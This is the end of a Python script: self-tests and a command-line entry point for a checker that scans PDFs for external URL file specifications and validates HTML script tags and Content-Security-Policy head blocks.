    assert pdf_scan(b"1 0 obj << /Type /XObject /F << /FS /URL /F (https://x) >> >>\nstream\n\nendstream") == {"PDF file specification with /FS /URL (external stream or media)"}
    # head block round-trips through the checker
    assert check_html(doc(head_extra=f'<script src="{XLSX}" {sri}></script>', scripts=[XLSX])) == []
    assert "script-src 'unsafe-inline' " + XLSX in head_block([XLSX])
    print("selftest ok")


if __name__ == "__main__":
    if sys.argv[1:2] == ["--selftest"]:
        selftest(); sys.exit(0)
    if sys.argv[1:2] == ["--head"]:
        sys.exit(head_cli(sys.argv[2:]))
    sys.exit(main(sys.argv[1:]))
